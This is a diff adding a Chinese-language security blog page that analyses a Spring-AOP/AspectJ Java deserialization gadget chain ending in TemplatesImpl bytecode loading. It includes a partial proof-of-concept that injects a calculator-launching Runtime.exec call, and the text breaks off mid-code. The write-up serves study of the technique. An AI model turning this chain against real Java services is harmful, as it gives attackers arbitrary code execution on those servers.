@@ -1,0 +1,458 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="a web leaner and ctfer">
+    <meta name="keyword" content="">
+    <meta name="theme-color" content="#600090">
+    <meta name="msapplication-navbutton-color" content="#600090">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="#600090">
+    <link rel="shortcut icon" href="https://cdn4.iconfinder.com/data/icons/ionicons/512/icon-person-128.png">
+    <link rel="alternate" type="application/atom+xml" title="lhRaMk7" href="/atom.xml">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.css">
+    <title>
+        
+        Spring-AOP链子学习｜lhRaMk7&#39;s blog
+        
+    </title>
+
+    <link rel="canonical" href="http://lhRaMk7.github.io/2025/03/31/Spring-AOP链子学习/">
+
+    <!-- Bootstrap Core CSS -->
+    
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/blog-style.css">
+
+
+    <!-- Pygments Github CSS -->
+    
+<link rel="stylesheet" href="/css/syntax.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<style>
+
+    header.intro-header {
+        background-image: url('/img/backup.jpeg')
+    }
+</style>
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="" class="animated fadeIn">
+<!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top " id="nav-top" data-ispost = "true" data-istags="false
+" data-ishome = "false" >
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand animated pulse" href="/">
+                <span class="brand-logo">
+                    lhRaMk7
+                </span>
+                's Blog
+            </a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <!-- /.navbar-collapse -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+					
+                    
+                        
+							
+                        <li>
+                            <a href="/Tags/">Tags</a>
+                        </li>
+							
+						
+                    
+					
+					
+                </ul>
+            </div>
+        </div>
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+//    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+<!-- Main Content -->
+
+<!--only post-->
+
+
+<img class="wechat-title-img"
+     src="/img/backup.jpeg">
+
+
+<style>
+    
+    header.intro-header {
+        background-image: url('/img/backup.jpeg')
+    }
+
+    
+</style>
+
+<header class="intro-header">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                <div class="post-heading">
+                    <h1>Spring-AOP链子学习</h1>
+                    
+                    <span class="meta">
+                         作者 lhRaMk7
+                        <span>
+                          日期 2025-03-31
+                         </span>
+                    </span>
+                    <div class="tags text-center">
+                        
+                        <a class="tag" href="/tags/#java"
+                           title="java">java</a>
+                        
+                        <a class="tag" href="/tags/#web"
+                           title="web">web</a>
+                        
+                        <br/><span id="busuanzi_container_page_pv" style="display:none;">阅读量:<span id="busuanzi_value_page_pv"></span>次</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="post-title-haojen">
+        <span>
+            Spring-AOP链子学习
+        </span>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Container -->
+            <div class="col-lg-8 col-lg-offset-1 col-sm-9 post-container">
+                <p>由于换季感冒躺了4天，早该的分析文章现在才发，废了废了</p>
+<h4 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h4><p>调用链子</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JdkDynamicAopProxy.invoke()-&gt;</span><br><span class="line">ReflectiveMethodInvocation.proceed()-&gt;</span><br><span class="line">AspectJAroundAdvice-&gt;invoke-&gt;</span><br><span class="line">org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod()-&gt;</span><br><span class="line">method.invoke()-&gt;TemplatesImp.newTransformer</span><br></pre></td></tr></table></figure>
+<p>依赖库</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spring-aop + aspectjweaver</span><br></pre></td></tr></table></figure>
+<p>pom.xml</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;project xmlns=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>  </span><br><span class="line">  xsi:schemaLocation=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd&quot;</span>&gt;  </span><br><span class="line">  &lt;modelVersion&gt;<span class="number">4.0</span><span class="number">.0</span>&lt;/modelVersion&gt;  </span><br><span class="line">  &lt;groupId&gt;org.example&lt;/groupId&gt;  </span><br><span class="line">  &lt;artifactId&gt;SpringAOP1&lt;/artifactId&gt;  </span><br><span class="line">  &lt;version&gt;<span class="number">1.0</span>-SNAPSHOT&lt;/version&gt;  </span><br><span class="line">  &lt;name&gt;Archetype - SpringAOP1&lt;/name&gt;  </span><br><span class="line">  &lt;url&gt;http:<span class="comment">//maven.apache.org&lt;/url&gt;  </span></span><br><span class="line">  &lt;dependencies&gt;    &lt;dependency&gt;      &lt;groupId&gt;org.springframework&lt;/groupId&gt;  </span><br><span class="line">      &lt;artifactId&gt;spring-aop&lt;/artifactId&gt;  </span><br><span class="line">      &lt;version&gt;<span class="number">5.3</span><span class="number">.19</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;    &lt;dependency&gt;      &lt;groupId&gt;org.aspectj&lt;/groupId&gt;  </span><br><span class="line">      &lt;artifactId&gt;aspectjweaver&lt;/artifactId&gt;  </span><br><span class="line">      &lt;version&gt;<span class="number">1.9</span><span class="number">.8</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;    &lt;dependency&gt;      &lt;groupId&gt;org.javassist&lt;/groupId&gt;  </span><br><span class="line">      &lt;artifactId&gt;javassist&lt;/artifactId&gt;  </span><br><span class="line">      &lt;version&gt;<span class="number">3.19</span><span class="number">.0</span>-GA&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  &lt;/dependencies&gt;&lt;/project&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="链子分析"><a href="#链子分析" class="headerlink" title="链子分析"></a>链子分析</h4><p><strong>sink点</strong><br>sink点在AbstractAspectJAdvice.invokeAdviceMethod会存在基反射方法以及调用<br><img src="https://obtuchaung-1321169885.cos.ap-chengdu.myqcloud.com//Users/lhramk7/picgo20250326191940.png" alt="image.png"><br>值得注意的是该类实现了反射方法并调用<br>并且在readObject方法中存在</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream inputStream)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;  </span><br><span class="line">    inputStream.defaultReadObject();  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.aspectJAdviceMethod = <span class="built_in">this</span>.declaringClass.getMethod(<span class="built_in">this</span>.methodName, <span class="built_in">this</span>.parameterTypes);  </span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;  </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Failed to find advice method on deserialization&quot;</span>, ex);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>readObject之后通过反射重新实例化了aspectJAdviceMethod属性配合上面的方法调用实现了实例化对象的可控<br>其中对于</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="built_in">this</span>.aspectJAdviceMethod.invoke(<span class="built_in">this</span>.aspectInstanceFactory.getAspectInstance(), actualArgs);</span><br></pre></td></tr></table></figure>
+<p>该参数的调用控制，所以这里的aspectInstanceFactory对象需要实现getAspectInstance方法并实现AspectInstanceFactory和Seralize接口能够实现序列化<br>有SingletonAspectInstanceFactory类刚好满足<br>至于另一个参数actualArgs就算不可控但是存在许多无参方法也可以实现攻击</p>
+<p>source点<br>所以基于上面的链接的关键就是对于aspectJAdviceMethod对象的控制，我们需要实现寻找能够调用到invokeAdviceMethod方法的类<br><img src="https://obtuchaung-1321169885.cos.ap-chengdu.myqcloud.com//Users/lhramk7/picgo20250326193654.png" alt="image.png"><br>举例这里发现继承了AbstractAspectJAdvice类的子类继承的invoke方法可以满足实现调用到AbstractAspectJAdvice.invokeAdviceMethod()方法<br>这里不知道为啥本地的classpath搜索不知道为啥犯病了，全文查找找不到，不知道是不是依赖的原因还是mac的原因。<br>所以其实任意子类就可以了，关键点在怎么触发得到对应字类的invoke方法<br>大佬们找到了ReflectiveMethodInvocation这个类，如下<br><img src="https://obtuchaung-1321169885.cos.ap-chengdu.myqcloud.com//Users/lhramk7/picgo20250326194154.png" alt="image.png"><br>熟悉的proceed方法的调用。<br>由于spring框架里面存在JdkDynamicAopProxy这个代理类，在这个代理类的invoke方法里面正好实现了process方法的调用<br><img src="https://obtuchaung-1321169885.cos.ap-chengdu.myqcloud.com//Users/lhramk7/picgo20250326194743.png" alt="image.png"><br>比较搞的是这个他刚好自己进行了ReflectiveMethodInvocation类的实例化和触发，刚好解决了ReflectiveMethodInvocation由于没有实现接口从而没办法进行序列化的问题<br>解决了触发问题我们再来分析下控制的对象的问题</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">proceed</span><span class="params">()</span> <span class="keyword">throws</span> Throwable &#123;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.currentInterceptorIndex == <span class="built_in">this</span>.interceptorsAndDynamicMethodMatchers.size() - <span class="number">1</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.invokeJoinpoint();  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">interceptorOrInterceptionAdvice</span> <span class="operator">=</span> <span class="built_in">this</span>.interceptorsAndDynamicMethodMatchers.get(++<span class="built_in">this</span>.currentInterceptorIndex);  </span><br><span class="line">        <span class="keyword">if</span> (interceptorOrInterceptionAdvice <span class="keyword">instanceof</span> InterceptorAndDynamicMethodMatcher) &#123;  </span><br><span class="line">            <span class="type">InterceptorAndDynamicMethodMatcher</span> <span class="variable">dm</span> <span class="operator">=</span> (InterceptorAndDynamicMethodMatcher)interceptorOrInterceptionAdvice;  </span><br><span class="line">            Class&lt;?&gt; targetClass = <span class="built_in">this</span>.targetClass != <span class="literal">null</span> ? <span class="built_in">this</span>.targetClass : <span class="built_in">this</span>.method.getDeclaringClass();  </span><br><span class="line">            <span class="keyword">return</span> dm.methodMatcher.matches(<span class="built_in">this</span>.method, targetClass, <span class="built_in">this</span>.arguments) ? dm.interceptor.invoke(<span class="built_in">this</span>) : <span class="built_in">this</span>.proceed();  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            <span class="keyword">return</span> ((MethodInterceptor)interceptorOrInterceptionAdvice).invoke(<span class="built_in">this</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里比较直观的是走下面的invoke<br>那我们由于需要让interceptorOrInterceptionAdvice是我们的AspectJAroundAdvice实例化的对象<br>所以不满足 if (interceptorOrInterceptionAdvice instanceofInterceptorAndDynamicMethodMatcher)<br>整个链子的基本调用就这些</p>
+<p>梳理整个的调用链子<br>1.反序列化时候借助动态代理调用到JdkDynamicAopProxy.invoke<br>2.控制invoke方法里面的ReflectiveMethodInvocation类生成对应的interceptorOrInterceptionAdvice对象为AspectJAroundAdvice<br>3.调用到AspectJAroundAdvice的invoke构造触发invokeAdviceMethod实现任意方法调用</p>
+<p>一个个来看，对于控制invoke方法里面的ReflectiveMethodInvocation我们再分析该方法,关键点在</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">target = targetSource.getTarget();  </span><br><span class="line">Class&lt;?&gt; targetClass = target != <span class="literal">null</span> ? target.getClass() : <span class="literal">null</span>;  </span><br><span class="line">List&lt;Object&gt; chain = <span class="built_in">this</span>.advised.getInterceptorsAndDynamicInterceptionAdvice(method, targetClass);  </span><br><span class="line">Object retVal;  </span><br><span class="line"><span class="keyword">if</span> (chain.isEmpty()) &#123;  </span><br><span class="line">    Object[] argsToUse = AopProxyUtils.adaptArgumentsIfNecessary(method, args);  </span><br><span class="line">    retVal = AopUtils.invokeJoinpointUsingReflection(target, method, argsToUse);  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">    <span class="type">MethodInvocation</span> <span class="variable">invocation</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReflectiveMethodInvocation</span>(proxy, target, method, args, targetClass, chain);  </span><br><span class="line">    retVal = invocation.proceed();  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>对应下ReflectiveMethodInvocation类的构造方法发现interceptorsAndDynamicMethodMatchers对应的就是chian对象</p>
+<p>分析对应的getInterceptorsAndDynamicInterceptionAdvice方法</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;Object&gt; <span class="title function_">getInterceptorsAndDynamicInterceptionAdvice</span><span class="params">(Method method, <span class="meta">@Nullable</span> Class&lt;?&gt; targetClass)</span> &#123;  </span><br><span class="line">    <span class="type">MethodCacheKey</span> <span class="variable">cacheKey</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodCacheKey</span>(method);  </span><br><span class="line">    List&lt;Object&gt; cached = (List)<span class="built_in">this</span>.methodCache.get(cacheKey);  </span><br><span class="line">    <span class="keyword">if</span> (cached == <span class="literal">null</span>) &#123;  </span><br><span class="line">        cached = <span class="built_in">this</span>.advisorChainFactory.getInterceptorsAndDynamicInterceptionAdvice(<span class="built_in">this</span>, method, targetClass);  </span><br><span class="line">        <span class="built_in">this</span>.methodCache.put(cacheKey, cached);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> cached;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里的getInterceptorsAndDynamicInterceptionAdvice方法是去获取并返回一个List，其中有一个元素是我们的对象至于怎么控制我们的想要的对象<br>查看一下发现获取途径有两个<br>1.methodCache缓存<br>2.this.advisorChainFactory.getInterceptorsAndDynamicInterceptionAdvice</p>
+<p>但是这里有点问题的是其中的methodCache字段存在transient修饰符无法进行序列化<br><img src="https://obtuchaung-1321169885.cos.ap-chengdu.myqcloud.com//Users/lhramk7/picgo20250331131414.png" alt="image.png"></p>
+<p>所以直接考虑第二种首先找下AdvisorChainFactory的实现类发现是DefaultAdvisorChainFactory</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;Object&gt; <span class="title function_">getInterceptorsAndDynamicInterceptionAdvice</span><span class="params">(Advised config, Method method, <span class="meta">@Nullable</span> Class&lt;?&gt; targetClass)</span> &#123;  </span><br><span class="line">    <span class="type">AdvisorAdapterRegistry</span> <span class="variable">registry</span> <span class="operator">=</span> GlobalAdvisorAdapterRegistry.getInstance();  </span><br><span class="line">    Advisor[] advisors = config.getAdvisors();  </span><br><span class="line">    List&lt;Object&gt; interceptorList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>(advisors.length);  </span><br><span class="line">    Class&lt;?&gt; actualClass = targetClass != <span class="literal">null</span> ? targetClass : method.getDeclaringClass();  </span><br><span class="line">    <span class="type">Boolean</span> <span class="variable">hasIntroductions</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span>(Advisor advisor : advisors) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (advisor <span class="keyword">instanceof</span> PointcutAdvisor) &#123;  </span><br><span class="line">            <span class="type">PointcutAdvisor</span> <span class="variable">pointcutAdvisor</span> <span class="operator">=</span> (PointcutAdvisor)advisor;  </span><br><span class="line">            <span class="keyword">if</span> (config.isPreFiltered() || pointcutAdvisor.getPointcut().getClassFilter().matches(actualClass)) &#123;  </span><br><span class="line">                <span class="type">MethodMatcher</span> <span class="variable">mm</span> <span class="operator">=</span> pointcutAdvisor.getPointcut().getMethodMatcher();  </span><br><span class="line">                <span class="type">boolean</span> match;  </span><br><span class="line">                <span class="keyword">if</span> (mm <span class="keyword">instanceof</span> IntroductionAwareMethodMatcher) &#123;  </span><br><span class="line">                    <span class="keyword">if</span> (hasIntroductions == <span class="literal">null</span>) &#123;  </span><br><span class="line">                        hasIntroductions = hasMatchingIntroductions(advisors, actualClass);  </span><br><span class="line">                    &#125;  </span><br><span class="line">  </span><br><span class="line">                    match = ((IntroductionAwareMethodMatcher)mm).matches(method, actualClass, hasIntroductions);  </span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                    match = mm.matches(method, actualClass);  </span><br><span class="line">                &#125;  </span><br><span class="line">  </span><br><span class="line">                <span class="keyword">if</span> (match) &#123;  </span><br><span class="line">                    MethodInterceptor[] interceptors = registry.getInterceptors(advisor);  </span><br><span class="line">                    <span class="keyword">if</span> (mm.isRuntime()) &#123;  </span><br><span class="line">                        <span class="keyword">for</span>(MethodInterceptor interceptor : interceptors) &#123;  </span><br><span class="line">                            interceptorList.add(<span class="keyword">new</span> <span class="title class_">InterceptorAndDynamicMethodMatcher</span>(interceptor, mm));  </span><br><span class="line">                        &#125;  </span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                        interceptorList.addAll(Arrays.asList(interceptors));  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (advisor <span class="keyword">instanceof</span> IntroductionAdvisor) &#123;  </span><br><span class="line">            <span class="type">IntroductionAdvisor</span> <span class="variable">ia</span> <span class="operator">=</span> (IntroductionAdvisor)advisor;  </span><br><span class="line">            <span class="keyword">if</span> (config.isPreFiltered() || ia.getClassFilter().matches(actualClass)) &#123;  </span><br><span class="line">                Interceptor[] interceptors = registry.getInterceptors(advisor);  </span><br><span class="line">                interceptorList.addAll(Arrays.asList(interceptors));  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            Interceptor[] interceptors = registry.getInterceptors(advisor);  </span><br><span class="line">            interceptorList.addAll(Arrays.asList(interceptors));  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> interceptorList;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里返回的是interceptorList列表，分析下他添加进去的元素</p>
+<p><img src="https://obtuchaung-1321169885.cos.ap-chengdu.myqcloud.com//Users/lhramk7/picgo20250331133738.png" alt="image.png"><br>关键点在于这里从register获取了一个对象<br>跟进下register发现真正的对象是DefaultAdvisorAdapterRegistry<br>那么最终实现是</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">  </span><br><span class="line"><span class="keyword">public</span> MethodInterceptor[] getInterceptors(Advisor advisor) <span class="keyword">throws</span> UnknownAdviceTypeException &#123;  </span><br><span class="line">    List&lt;MethodInterceptor&gt; interceptors = <span class="keyword">new</span> <span class="title class_">ArrayList</span>(<span class="number">3</span>);  </span><br><span class="line">    <span class="type">Advice</span> <span class="variable">advice</span> <span class="operator">=</span> advisor.getAdvice();  </span><br><span class="line">    <span class="keyword">if</span> (advice <span class="keyword">instanceof</span> MethodInterceptor) &#123;  </span><br><span class="line">        interceptors.add((MethodInterceptor)advice);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span>(AdvisorAdapter adapter : <span class="built_in">this</span>.adapters) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (adapter.supportsAdvice(advice)) &#123;  </span><br><span class="line">            interceptors.add(adapter.getInterceptor(advisor));  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (interceptors.isEmpty()) &#123;  </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnknownAdviceTypeException</span>(advisor.getAdvice());  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> (MethodInterceptor[])interceptors.toArray(<span class="keyword">new</span> <span class="title class_">MethodInterceptor</span>[<span class="number">0</span>]);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>此时我们得需求时希望把AspectJAroundAdvice对象作为interceptorList对象进行返回<br>那么我们可以得知的是AspectJAroundAdvice已经实现了MethodInterceptor接口，我们但是这里的advice对象实现的是Advice接口<br>所以我们只需要借助熟悉的动态代理直接给AspectJAroundAdvice对象加一层接口实现就行<br>那么整个就通了</p>
+<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><p>个人在构造poc的时候有几点<br>1.触发到我们添加的代理的AdvisedSupport时候可以借助toString方法去实现调用<br>2.对于AdvisedSupport中advisors属性所包含的列表对象，实现构造我们的恶意的对象的时候需要实现Advisor接口来赋予我们对应的属性advice为我们的AspectJAroundAdvice对象的代理对象<br>所以最后借助了DefaultIntroductionAdvisor对象来实现</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;  </span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;  </span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;  </span><br><span class="line"><span class="keyword">import</span> org.aopalliance.aop.Advice;  </span><br><span class="line"><span class="keyword">import</span> org.aopalliance.intercept.MethodInterceptor;  </span><br><span class="line"><span class="keyword">import</span> org.omg.CORBA.portable.InvokeHandler;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.Advisor;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.AspectJAroundAdvice;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.AspectJExpressionPointcut;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.SingletonAspectInstanceFactory;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.framework.AdvisedSupport;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.framework.DefaultAdvisorChainFactory;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.framework.ReflectiveMethodInvocation;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.framework.adapter.DefaultAdvisorAdapterRegistry;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.support.DefaultIntroductionAdvisor;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classpool</span> <span class="operator">=</span> ClassPool.getDefault();  </span><br><span class="line">        classpool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));  </span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classpool.makeClass(<span class="string">&quot;Exp&quot;</span>);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open /System/Applications/Calculator.app\&quot;);&quot;</span>;  </span><br><span class="line">        ctClass.setSuperclass(classpool.get(AbstractTranslet.class.getName()));  </span><br><span class="line">        ctClass.makeClassInitializer().insertBefore(cmd);  </span><br><span class="line">        <span class="type">byte</span>[] bytecode = ctClass.toBytecode();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        bytecodesField.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;);  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates, <span class="string">&quot;Exp&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">SingletonAspectInstanceFactory</span> <span class="variable">singletonAspectInstanceFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SingletonAspectInstanceFactory</span>(templates);  </span><br><span class="line">        <span class="type">AspectJExpressionPointcut</span> <span class="variable">aspectJExpressionPointcut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AspectJExpressionPointcut</span>();  </span><br><span class="line">        <span class="type">Method</span> <span class="variable">newtransfrom</span> <span class="operator">=</span> TemplatesImpl.class.getMethod(<span class="string">&quot;newTransformer&quot;</span>);  </span><br><span class="line">        <span class="type">AdvisedSupport</span> <span class="variable">advisedSupport1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        <span class="type">AspectJAroundAdvice</span> <span class="variable">aspectJAroundAdvice</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AspectJAroundAdvice</span>(newtransfrom,aspectJExpressionPointcut,singletonAspectInstanceFactory);  </span><br><span class="line">        advisedSupport1.setTarget(aspectJAroundAdvice);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">jdkproxy</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);  </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> jdkproxy.getDeclaredConstructor(AdvisedSupport.class);  </span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">jdkinvoke</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(advisedSupport1);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">advice</span> <span class="operator">=</span>  java.lang.reflect.Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Advisor.class, MethodInterceptor.class&#125;,jdkinvoke);  </span><br><span class="line">        <span class="type">ArrayList</span> <span class="variable">array</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();  </span><br><span class="line">        <span class="type">AdvisedSupport</span> <span class="variable">advisedSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();  